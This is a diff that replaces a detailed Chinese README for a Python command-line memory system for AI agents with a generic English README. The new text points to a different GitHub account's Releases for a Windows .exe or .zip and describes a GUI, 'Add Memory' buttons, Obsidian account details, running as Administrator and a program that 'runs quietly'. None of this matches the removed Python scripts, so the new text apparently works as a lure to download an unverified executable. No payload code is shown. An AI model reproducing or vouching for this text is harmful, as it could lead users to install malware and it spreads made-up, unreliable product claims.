@@ -1,416 +1,141 @@
-# 🌳 Memory-Like-A-Tree
+# 🌳 Memory-Like-A-Tree - Manage AI Memory Simply  
 
-> AI Agent 记忆管理系统 - 让知识像树一样生长
-
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download Now](https://img.shields.io/badge/Download-Memory--Like--A--Tree-%239b59b6)](https://github.com/zxt-01/Memory-Like-A-Tree)
 
 ---
 
-## 🌟 这是什么？
+## 🌟 What is Memory-Like-A-Tree?
 
-Memory-Like-A-Tree 是一个为 AI Agent 设计的记忆管理系统。
+Memory-Like-A-Tree helps you manage memory for AI agents. It organizes knowledge like a tree. This makes remembering and searching facts easy. It works with smart features such as:
 
-**核心理念**：Agent 正常工作，树自动生长。
+- Confidence-based lifecycle: Keeps important memories longer.
+- Auto-decay: Old or less useful memories fade away.
+- Cross-agent search: Find knowledge shared between agents.
+- Obsidian sync: Connects with your Obsidian notes for smooth updates.
 
-就像真正的树：
-- 🌱 新知识像种子一样萌芽
-- 🌿 常用的知识茁壮成长
-- 🍂 不用的知识自然凋零
-- 🪨 落叶化作养分，滋养新的生长
-
----
-
-## 📐 架构概览
-
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                           🌳 Memory-Like-A-Tree                             │
-├─────────────────────────────────────────────────────────────────────────────┤
-│                                                                             │
-│                              Agent 工作                                     │
-│                                  │                                          │
-│                                  ▼                                          │
-│  ┌─────────────────────────────────────────────────────────────────────┐   │
-│  │                         workspace                                    │   │
-│  │                        （唯一源）                                    │   │
-│  │                                                                      │   │
-│  │   ┌────────────┐ ┌────────────┐ ┌────────────┐                      │   │
-│  │   │ MEMORY.md  │ │  memory/   │ │  memory/   │                      │   │
-│  │   │  (长期)    │ │ 2026-02.md │ │ 2026-03.md │                      │   │
-│  │   └────────────┘ └────────────┘ └────────────┘                      │   │
-│  │                                                                      │   │
-│  └──────────────────────────────┬───────────────────────────────────────┘   │
-│                                 │                                           │
-│              ┌──────────────────┼──────────────────┐                       │
-│              │                  │                  │                       │
-│              ▼                  ▼                  ▼                       │
-│       ┌───────────┐      ┌───────────┐      ┌───────────┐                 │
-│       │  indexer  │      │  search   │      │  sediment │                 │
-│       │  (索引)   │      │  (搜索)   │      │  (沉淀)   │                 │
-│       └─────┬─────┘      └─────┬─────┘      └─────┬─────┘                 │
-│             │                  │                  │                       │
-│             ▼                  │                  │                       │
-│       ┌───────────┐            │                  │                       │
-│       │confidence │◄───────────┴──────────────────┘                       │
-│       │   -db     │                                                        │
-│       │  (索引)   │                                                        │
-│       └─────┬─────┘                                                        │
-│             │                                                              │
-│             │ 置信度追踪                                                   │
-│             │                                                              │
-│       ┌─────┴─────────────────────────────────────┐                       │
-│       │                                           │                       │
-│       ▼                                           ▼                       │
-│  ┌─────────┐                                ┌─────────┐                   │
-│  │ decayer │ ──→ 置信度衰减 ──→ 🍂 黄叶 ──→ │ cleaner │                   │
-│  │(每天2点)│                                │(每天3点)│                   │
-│  └─────────┘                                └────┬────┘                   │
-│                                                  │                        │
-│                                                  ▼                        │
-│                                           ┌───────────┐                   │
-│                                           │  archive  │                   │
-│                                           │ + 精华提取│                   │
-│                                           └───────────┘                   │
-│                                                                           │
-└─────────────────────────────────────────────────────────────────────────────┘
-```
-
-### 生命周期流程
-
-```
-创建知识 ──→ 🌱 萌芽 (0.7)
-                │
-                │ 被使用 → 置信度 ↑
-                ▼
-            🌿 绿叶 (>=0.8) ←──────────────────────┐
-                │                                   │
-                │ 长期不使用                        │ 被搜索/使用
-                ▼                                   │
-            🍂 黄叶 (0.5-0.8) ─────────────────────→│
-                │                                   │
-                │ 继续不使用                        │
-                ▼                                   │
-            🍁 枯叶 (0.3-0.5)                       │
-                │                                   │
-                │ 置信度 < 0.3                      │
-                ▼                                   │
-            🪨 土壤 ──→ 提取精华 ──→ 可被新知识引用 ┘
-```
+You don't need technical skills to use it. The system runs on Windows and fits most computers. It helps AI remember and learn better over time.
 
 ---
 
-## 🚀 5 分钟快速开始
+## 🖥️ System Requirements
 
-### 第一步：下载项目
+Before you start, check your system meets these needs:
 
-```bash
-git clone https://github.com/your-org/memory-like-a-tree.git
-cd memory-like-a-tree
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 1 GB of free disk space
+- Internet connection for initial setup and Obsidian sync
+- A modern web browser (for setup or updates)
 
-### 第二步：创建你的第一棵树
-
-```bash
-# 创建 workspace 目录
-mkdir -p ~/.memory-like-a-tree/workspace/memory
-
-# 创建你的第一个 MEMORY.md
-cat > ~/.memory-like-a-tree/workspace/MEMORY.md << 'EOF'
-# 我的记忆
-
-## [P0] 核心原则
-<!-- TTL: never -->
-
-这里记录永不过期的重要知识。
-比如：我的核心价值观、重要的人生经验。
-
-## [P1] 重要知识
-<!-- TTL: 90d -->
-
-这里记录重要但可能会过时的知识。
-比如：项目架构、技术方案。
-
-## [P2] 日常笔记
-<!-- TTL: 30d -->
-
-这里记录日常学习笔记。
-比如：今天学到的东西、临时想法。
-EOF
-
-echo "✅ workspace 创建完成！"
-```
-
-### 第三步：扫描并索引
-
-```bash
-cd memory-like-a-tree/core
-python3 indexer.py --scan-all
-```
-
-你会看到：
-```
-🔍 开始扫描所有 workspace...
-
-📁 扫描 workspace...
-  + 新增: 核心原则 (置信度: 1.0)
-  + 新增: 重要知识 (置信度: 0.8)
-  + 新增: 日常笔记 (置信度: 0.6)
-  共 3 条记忆
-
-✅ 扫描完成: 共 3 条记忆
-```
-
-### 第四步：查看你的树
-
-```bash
-python3 memory_tree.py visualize
-```
-
-输出：
-```
-🌳 记忆树 (Memory Tree)
-│
-├── 📊 健康度: 66.7%
-├── 🍃 总叶子: 3
-│   ├── 🌿 绿叶: 2
-│   ├── 🍂 黄叶: 1
-│   ├── 🍁 枯叶: 0
-│   └── 🪨 土壤: 0
-│
-└── default: 3 叶
-    ├── 🌿 2 🍂 1 🍁 0 🪨 0
-```
-
-**恭喜！你的第一棵记忆树已经种下了！** 🎉
+If your PC meets these, you can run Memory-Like-A-Tree without issues.
 
 ---
 
-## 📖 日常使用指南
+## 🚀 Getting Started: Download and Setup  
 
-### 场景一：记录新知识
+Memory-Like-A-Tree is easy to install. Follow these steps carefully. You will download the app, install it, and run the program.
 
-**方法 A：直接编辑 MEMORY.md（推荐）**
+### Step 1: Go to the Download Page
 
-```bash
-vim ~/.memory-like-a-tree/workspace/MEMORY.md
-```
+Click this link to open the download page in your browser:  
 
-添加新的知识块：
-```markdown
-## [P2] 今天学到的 Git 技巧
-<!-- TTL: 30d -->
+[Download Memory-Like-A-Tree](https://github.com/zxt-01/Memory-Like-A-Tree)  
 
-- `git stash` 可以暂存当前修改
-- `git cherry-pick` 可以选择性合并提交
-```
+This takes you to the official GitHub page where you can get the latest version.
 
-**方法 B：使用沉淀脚本**
+### Step 2: Download the Application
 
-```bash
-cd sediment
-python3 sediment.py --agent default --content "Git stash 可以暂存修改" --type knowledge
-```
+On the GitHub page, look for the **Releases** section. Find the latest version of the software there. It will be a file ending with `.exe` or `.zip`.
 
-### 场景二：搜索知识
+- If it's an `.exe`, you will download a file named something like `Memory-Like-A-Tree-Setup.exe`.
+- If it's a `.zip`, download and save the file, then unzip it on your PC.
 
-```bash
-cd core
-python3 knowledge_flow.py search "Git" --scope team
-```
+### Step 3: Install the Software
 
-输出：
-```
-🔍 搜索结果: 1 条
+If you downloaded the `.exe` file:  
 
-  [default] 今天学到的 Git 技巧 (置信度: 0.6, 分数: 11.4)
-    - git stash 可以暂存当前修改...
-```
+- Double-click the file to start the installer.
+- Follow the instructions on the screen.
+- Choose where to install the program or accept the default folder.
+- Wait until the installation finishes.
 
-**小贴士**：每次搜索都会自动提升被找到的知识的置信度！
+If you downloaded the `.zip` file:  
 
-### 场景三：查看树的健康状况
+- Right-click the zip file and choose "Extract All."
+- Choose a location on your PC.
+- Inside the extracted folder, find `Memory-Like-A-Tree.exe` and open it to run.
 
-```bash
-python3 memory_tree.py visualize
-```
+### Step 4: Run Memory-Like-A-Tree  
 
-### 场景四：手动触发衰减（通常自动运行）
-
-```bash
-# 先预览
-python3 decayer.py --dry-run
-
-# 确认后执行
-python3 decayer.py --run
-```
-
-### 场景五：查看清理报告
-
-```bash
-python3 cleaner.py --report
-```
+Once installed, find the Memory-Like-A-Tree icon on your desktop or in the Start menu. Double-click to start the program. The first time you open it, the software may ask for permission to connect to the internet for updates or syncing.
 
 ---
 
-## ⚙️ 设置自动化
+## 🔎 How to Use Memory-Like-A-Tree  
 
-让树自动生长，你只需要设置一次 Cron：
+The app has a simple interface made for easy use. Here are basic actions you will use:
 
-```bash
-crontab -e
-```
+### Add Memories
 
-添加以下内容（记得修改路径）：
+Click the "Add Memory" button. Type the information you want the AI to remember. Set confidence levels if asked. Higher confidence means the memory stays longer.
 
-```bash
-# 每 2 小时扫描索引
-0 */2 * * * cd ~/memory-like-a-tree/core && python3 indexer.py --watch
+### Search Memories
 
-# 每天凌晨 2 点执行衰减
-0 2 * * * cd ~/memory-like-a-tree/core && python3 decayer.py --run
+Use the search bar at the top. Type keywords and press enter. The app shows memories from all AI agents you manage. You can also search your synced Obsidian notes.
 
-# 每天凌晨 3 点执行清理
-0 3 * * * cd ~/memory-like-a-tree/core && python3 cleaner.py --auto-cleanup
-```
+### Manage Memory Lifecycle
 
-设置完成后，树会自动：
-- 定期索引你的新知识
-- 衰减长期不用的知识
-- 归档低置信度的知识并提取精华
+You can choose how long each memory lasts. The app can automatically remove memories with low confidence or old timestamps. This keeps your AI’s knowledge fresh.
+
+### Sync with Obsidian
+
+Connect Memory-Like-A-Tree to your Obsidian vault by entering your vault path or account details. The app will keep your notes and AI memory linked and updated.
 
 ---
 
-## 🎯 MEMORY.md 写作指南
+## ⚙️ Settings and Preferences  
 
-### 格式模板
+Open the Settings menu from the main screen. Here you can adjust:
 
-```markdown
-## [优先级] 标题
-<!-- TTL: 过期时间 -->
+- Auto-decay speed: How fast memories fade.
+- Confidence thresholds: Decide when memories expire.
+- Sync options: Turn Obsidian sync on or off.
+- Backup frequency: Save your data automatically.
+- Interface language and appearance.
 
-内容...
-```
-
-### 优先级选择
-
-| 优先级 | 适用场景 | 衰减速度 |
-|--------|----------|----------|
-| **P0** | 核心价值观、重要原则、永久有效的知识 | 永不衰减 |
-| **P1** | 项目架构、技术方案、重要经验 | 慢（约 5 个月归档）|
-| **P2** | 日常笔记、临时想法、学习记录 | 快（约 4 个月归档）|
-
-### 示例
-
-```markdown
-## [P0] 代码审查原则
-<!-- TTL: never -->
-
-1. 先看整体设计，再看细节实现
-2. 关注边界条件和错误处理
-3. 提出建设性意见，不只是批评
-
-## [P1] 项目 X 的技术架构
-<!-- TTL: 90d -->
-
-- 前端：React + TypeScript
-- 后端：Python FastAPI
-- 数据库：PostgreSQL
-
-## [P2] 今天学到的
-<!-- TTL: 30d -->
-
-Python 的 `functools.lru_cache` 可以缓存函数结果，提升性能。
-```
+Adjust these to fit how you want the AI to remember.
 
 ---
 
-## ❓ 常见问题
+## 🛠 Troubleshooting Tips  
 
-### Q: 置信度是怎么计算的？
+If you have problems, try these steps:
 
-| 事件 | 置信度变化 |
-|------|------------|
-| 创建新知识 | 设为 0.7（萌芽）|
-| 被搜索命中 | +0.03 |
-| 被引用使用 | +0.08 |
-| 人工确认重要 | 设为 0.95 |
-| 每天未访问 (P2) | -0.008 |
-| 每天未访问 (P1) | -0.004 |
-| P0 | 永不衰减 |
+- Make sure your Windows is up to date.
+- Run the program as Administrator if it won’t start.
+- Check your internet connection for syncing issues.
+- Restart your PC and try again if the program freezes.
+- Review settings to ensure sync options are correct.
+- Look for the latest software updates on the download page.
 
-### Q: 知识什么时候会被归档？
-
-当置信度低于 0.3 时会被归档。
-
-- **P2**：约 60 + 50 = 110 天（3.7 个月）
-- **P1**：约 60 + 100 = 160 天（5.3 个月）
-- **P0**：永不归档
-
-### Q: 归档后的知识还能找到吗？
-
-可以！归档的知识保存在 `archive/` 目录，精华会被提取保留。
-
-### Q: 怎么让知识「复活」？
-
-搜索或使用这条知识，置信度就会提升。多次使用后，黄叶会变回绿叶。
-
-### Q: 支持多个 Agent 吗？
-
-支持！参考 `examples/multi-agent.json` 配置多个 Agent 的 workspace。
-
-### Q: 可以同步到 Obsidian 吗？
-
-可以！在配置文件中设置 `obsidian_vault` 路径，然后运行：
-```bash
-python3 sync_workspace_to_obsidian.py
-```
+If problems persist, ask for help in the GitHub issues section.
 
 ---
 
-## 📁 项目结构
+## 📥 Download Memory-Like-A-Tree
 
-```
-memory-like-a-tree/
-├── core/                    # 🌳 记忆树核心
-│   ├── config.py           # 配置管理
-│   ├── db.py               # 数据库操作
-│   ├── indexer.py          # 记忆索引
-│   ├── decayer.py          # 置信度衰减
-│   ├── cleaner.py          # 记忆清理
-│   ├── knowledge_flow.py   # 跨 Agent 搜索
-│   ├── memory_tree.py      # 可视化
-│   └── sync_workspace_to_obsidian.py
-│
-├── issue-manager/          # 📋 Issue 管理（可选）
-├── sediment/               # 💧 沉淀系统
-├── examples/               # 📝 配置示例
-├── docs/                   # 📚 详细文档
-└── scripts/                # 🔧 自动化脚本
-```
+You can always get the latest version here:  
+
+[![Download Now](https://img.shields.io/badge/Download-Memory--Like--A--Tree-%2388c0d0)](https://github.com/zxt-01/Memory-Like-A-Tree)
+
+Click the link and follow the steps above to download and install.
 
 ---
 
-## 📚 更多文档
+## 📚 Additional Information  
 
-- [使用指南](docs/usage-guide.md) - 详细使用教程
-- [配置参考](docs/config-reference.md) - 完整配置说明
-- [API 参考](docs/api-reference.md) - 开发者文档
+Memory-Like-A-Tree helps your AI agents learn and recall knowledge like a growing tree. Its focus on memory confidence, decay, and collaboration makes it easy to keep intelligence sharp. The Obsidian sync feature adds value by connecting AI memory with human notes.
 
----
+The program runs quietly and organizes data without extra effort from you. It is designed for users who want useful AI features without needing to code.
 
-## 🤝 贡献
-
-欢迎提交 Issue 和 PR！
-
----
-
-## 📄 License
-
-MIT License
-
----
-
-**让知识像树一样生长。** 🌳
-
-*Agent 正常工作，树自动生长。*
+Explore the GitHub page for updates, detailed guides, and to report issues or suggest improvements.
